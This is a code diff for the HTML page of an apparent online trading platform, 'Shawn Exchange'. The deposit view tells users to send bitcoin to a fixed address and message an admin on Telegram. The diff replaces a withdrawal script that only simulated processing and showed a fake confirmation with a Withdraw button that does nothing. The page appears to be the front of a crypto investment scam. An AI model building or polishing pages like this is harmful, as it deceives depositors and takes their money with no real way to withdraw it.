@@ -53,7 +53,7 @@
 
         /* Animated Background (Subtle Chart Waves - Original) */
         .hero-bg {
-            background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE6sQxeZjs4llCE8XaQOprDAMvKrRxXrtVPeQ3VJ25r-vXJS8KIBhxXF64MJOIbEDkBSuuEi3vwh860gXkg4mZFUpBHXAPmBvywdmuQqdPHoOrEpWTSLJo3FCShkRSRuIdtMwz9JQX6k6OeckVShCun-wIQOtKIv0z4MwWYDb9WwZ6H6Cg8aQ0exLe_Ek/s320/maxim-hopman-fiXLQXAhCfk-unsplash.jpg");
+            background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE6sQxeZjs4llCE8XaQOprDAMvKrRxXrtVPeQ3VJ25r-vXJS8KIBhxXF64MJOIbEDkBSu0uEi3vwh860gXkg4mZFUpBHXAPmBvywdmuQqdPHoOrEpWTSLJo3FCShkRSRuIdtMwz9JQX6k6OeckVShCun-wIQOtKIv0z4MwWYDb9WwZ6H6Cg8aQ0exLe_Ek/s320/maxim-hopman-fiXLQXAhCfk-unsplash.jpg");
             background-size: cover;
             animation: gradientShift 20s ease infinite alternate;
         } 
@@ -156,8 +156,8 @@
                                 <center><img alt="stg" border="0" width="400" data-original-height="346" data-original-width="720" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOqu_SxXuvXpHnhCcUbX5BzK1ieySlaSzc5h41QPYK1uUyAAHLhaqAxli3l02G2ykUYbIMtu24wPwLJxIc8H97trsEAoGRW6cgkptvcXKNdyVwgdBg-l-1IxdXA5t_xkQ_6FVe-vVyaupmz6Mv6GNmVKbTHObx2P_B_MmHZtPWbG4rAEpkuQPtwPBfQ28/s400/470217989_122209822904026435_23819967085114148_n-removebg-preview.png"/>            </center><br><br>
                     <h1 class="text-5xl sm:text-6xl md:text-7xl font-extrabold mb-6 tracking-tight text-white">
                         Trade Smarter, Earn Faster
-                        <span class="block text-swift-gold mt-2">Welcome To Shawn Exchange
-                    </span>
+                        <span class="block text-swift-gold mt-2">— Welcome To Shawn Exchange
+</span>
                     </h1>
                     <p class="text-xl md:text-2xl text-light-300 max-w-3xl mx-auto mb-10 font-light">
                         Join thousands of traders who trust our platform for Forex, Crypto, and CFD trading with ultra-low latency and transparent pricing.
@@ -393,59 +393,12 @@
                         <button onclick="showView('page-deposit')" class="w-full py-3 rounded-lg bg-swift-gold text-swift-dark font-bold hover:bg-yellow-400 flex items-center justify-center">
                             <i data-lucide="wallet" class="w-5 h-5 mr-2"></i> Deposit Funds
                         </button>
-                        <button id="start-button" onclick="showPage('page-form')"
-                            class="w-full py-3 rounded-lg bg-swift-blue text-white font-bold hover:bg-blue-800 flex items-center justify-center">
-                            <i data-lucide="banknote" class="w-5 h-5 mr-2"></i> WITHDRAW FUNDS
-                        </button> 
-
-                        <!-- <button id="start-button" onclick="showPage('page-form')" 
-                      class="w-full sm:w-auto px-8 py-3 bg-accent-yellow hover:bg-yellow-600 text-primary-dark font-bold rounded-xl transition duration-200 shadow-lg transform hover:scale-105">
-                        <i data-lucide="banknote" class="w-5 h-5 mr-2"></i>WITHDRAW FUNDS NOW
-                      </button> -->
+                        <button class="w-full py-3 rounded-lg bg-swift-blue text-white font-bold hover:bg-blue-800 flex items-center justify-center">
+                            <i data-lucide="banknote" class="w-5 h-5 mr-2"></i> Withdraw
+                        </button>
                     </div>
-
-
                 </aside>
 
-
-              
-                    
-                    <!-- ============================================= -->
-        <!-- 4. DEPOSIT VIEW (No changes here, kept functional) -->
-        <!-- ============================================= -->
-        <div id="page-deposit" class="hidden py-20 bg-swift-navy flex flex-col items-center justify-center min-h-screen w-full">
-            <div class="w-full max-w-2xl bg-swift-dark p-8 md:p-10 rounded-xl shadow-lg border border-swift-gold/50 text-center">
-                
-                <!-- Instruction Headline -->
-                <h2 class="text-3xl font-bold text-white mb-6">
-                    Make payment to this bitcoin address and send your screenshot to the admin on telegram
-                </h2>
-                
-                <p class="text-gray-400 mb-4">Your personalized deposit address (BTC Network):</p>
-                
-                <!-- Bitcoin Address Box -->
-                <div class="flex flex-col gap-4 mb-8">
-                    <input type="text" id="btc-address" value="bc1qxy2kgjd00eazl6l6n97tpxf24687k2g59v72a" readonly class="w-full p-4 bg-swift-navy border border-swift-gold rounded-lg text-swift-gold font-mono text-lg text-center select-all shadow-lg">
-                    <button onclick="copyToClipboard('btc-address')" class="w-full py-3 rounded-full bg-swift-gold text-swift-dark font-bold hover:bg-yellow-400 flex items-center justify-center">
-                        <i data-lucide="copy" class="w-5 h-5 mr-2"></i> Copy Bitcoin Address
-                    </button>
-                </div>
-                
-                <hr class="border-gray-800 mb-8">
-                
-                <!-- Telegram Button -->
-                <a href="https://t.me/admin_swiftfx" target="_blank" class="w-full py-3 rounded-full border-2 border-green-500 text-green-500 font-bold text-lg hover:bg-green-500/10 flex items-center justify-center">
-                    <i data-lucide="send" class="w-6 h-6 mr-3"></i> Contact Admin on Telegram
-                </a>
-                
-                <!-- Back Button -->
-                <button onclick="showView('page-dashboard')" class="mt-6 text-gray-400 hover:text-swift-gold transition-colors text-sm">
-                    ← Back to Dashboard
-                </button>
-            </div>
-        </div>
-
-                
                 <!-- Main Content Area -->
                 <div class="lg:col-span-3 space-y-8">
                     
@@ -487,10 +440,42 @@
                 </div>
             </div>
         </div>
-
-
         
-        
+        <!-- ============================================= -->
+        <!-- 4. DEPOSIT VIEW (No changes here, kept functional) -->
+        <!-- ============================================= -->
+        <div id="page-deposit" class="hidden py-20 bg-swift-navy flex flex-col items-center justify-center min-h-screen w-full">
+            <div class="w-full max-w-2xl bg-swift-dark p-8 md:p-10 rounded-xl shadow-lg border border-swift-gold/50 text-center">
+                
+                <!-- Instruction Headline -->
+                <h2 class="text-3xl font-bold text-white mb-6">
+                    Make payment to this bitcoin address and send your screenshot to the admin on telegram
+                </h2>
+                
+                <p class="text-gray-400 mb-4">Your personalized deposit address (BTC Network):</p>
+                
+                <!-- Bitcoin Address Box -->
+                <div class="flex flex-col gap-4 mb-8">
+                    <input type="text" id="btc-address" value="bc1qxy2kgjd00eazl6l6n97tpxf24687k2g59v72a" readonly class="w-full p-4 bg-swift-navy border border-swift-gold rounded-lg text-swift-gold font-mono text-lg text-center select-all shadow-lg">
+                    <button onclick="copyToClipboard('btc-address')" class="w-full py-3 rounded-full bg-swift-gold text-swift-dark font-bold hover:bg-yellow-400 flex items-center justify-center">
+                        <i data-lucide="copy" class="w-5 h-5 mr-2"></i> Copy Bitcoin Address
+                    </button>
+                </div>
+                
+                <hr class="border-gray-800 mb-8">
+                
+                <!-- Telegram Button -->
+                <a href="https://t.me/admin_swiftfx" target="_blank" class="w-full py-3 rounded-full border-2 border-green-500 text-green-500 font-bold text-lg hover:bg-green-500/10 flex items-center justify-center">
+                    <i data-lucide="send" class="w-6 h-6 mr-3"></i> Contact Admin on Telegram
+                </a>
+                
+                <!-- Back Button -->
+                <button onclick="showView('page-dashboard')" class="mt-6 text-gray-400 hover:text-swift-gold transition-colors text-sm">
+                    ← Back to Dashboard
+                </button>
+            </div>
+        </div>
+
     </main>
 
     <!-- Footer (Hidden on Dashboard/Deposit) -->
@@ -503,83 +488,6 @@
             <p class="mt-4">&copy; 2023 Shawn Exchange. All rights reserved.</p>
         </div>
     </footer>
-
-
-     <script>
-        // --- VIEW MANAGEMENT ---
-        function showPage(pageId) {
-            const pages = ['page-start', 'page-form', 'page-confirmation'];
-            
-            pages.forEach(id => {
-                const element = document.getElementById(id);
-                if (element) {
-                    // Hide all pages
-                    element.classList.add('hidden');
-                    // Remove flex utility for hidden pages
-                    element.classList.remove('flex'); 
-                }
-            });
-
-            const target = document.getElementById(pageId);
-            if (target) {
-                // Show the target page
-                target.classList.remove('hidden');
-                // Add flex utility for center alignment on certain pages
-                if (pageId === 'page-start' || pageId === 'page-confirmation') {
-                    target.classList.add('flex');
-                }
-            }
-        }
-
-        // --- FORM HANDLER ---
-        function handleWithdrawal(event) {
-            event.preventDefault(); // Stop the form from submitting normally
-            
-            // In a real app, you would capture all form data here:
-            const fullName = document.getElementById('full-name').value.trim();
-            const btcAddress = document.getElementById('btc-address').value.trim();
-            const amount = document.getElementById('withdraw-amount').value.trim();
-            const confirmCheck = document.getElementById('confirm-check').checked;
-            
-            const submitBtn = document.getElementById('withdraw-button');
-
-            // Basic validation check (HTML handles most of the 'required' attributes)
-            if (!confirmCheck) {
-                console.error("Confirmation box not checked.");
-                return;
-            }
-
-            if (!fullName || !btcAddress || !amount) {
-                console.error("Please fill in all required fields.");
-                return;
-            }
-
-
-            // Simulate loading state
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Processing...';
-
-            // Simulate API call delay (2 seconds)
-            setTimeout(() => {
-                // Reset button state (optional, since we move to a new page)
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'CONFIRM WITHDRAWAL';
-                
-                // Navigate to the confirmation page
-                showPage('page-confirmation');
-                
-                // Clear the form fields after submission
-                document.getElementById('withdrawal-form').reset();
-            }, 2000); 
-        }
-
-        // --- INITIALIZATION ---
-        // Ensure the start page is the first thing the user sees when the page loads
-        document.addEventListener('DOMContentLoaded', () => {
-            showPage('page-start');
-        });
-    
-
 
 
     <!-- JavaScript for Logic and Functionality -->
